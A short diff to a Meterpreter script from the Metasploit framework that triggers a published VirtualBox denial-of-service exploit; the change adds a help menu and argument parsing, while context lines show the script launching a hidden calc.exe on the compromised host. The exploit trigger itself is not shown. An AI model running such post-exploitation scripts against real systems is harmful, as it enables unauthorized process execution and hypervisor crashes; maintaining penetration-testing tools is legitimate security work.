@@ -3,6 +3,21 @@
 # Meterpreter script for triggering the VirtualBox DoS published at:
 # http://milw0rm.com/exploits/9323
 
+opts = Rex::Parser::Arguments.new(
+	"-h" => [ false,"Help menu." ]
+)
+
+opts.parse(args) { |opt, idx, val|
+	case opt
+	when "-h"
+		print_line("virtualbox_sysenter_dos -- trigger the VirtualBox DoS published at http://milw0rm.com/exploits/9323")
+		print_line("USAGE: run virtualbox_sysenter_dos")
+		print_status(opts.usage)
+		raise Rex::Script::Completed
+	end
+}
+
+
 # Spawn calculator
 pid = client.sys.process.execute("calc.exe", nil, {'Hidden' => 'true'}).pid
 print_status("Calculator PID is #{pid}")
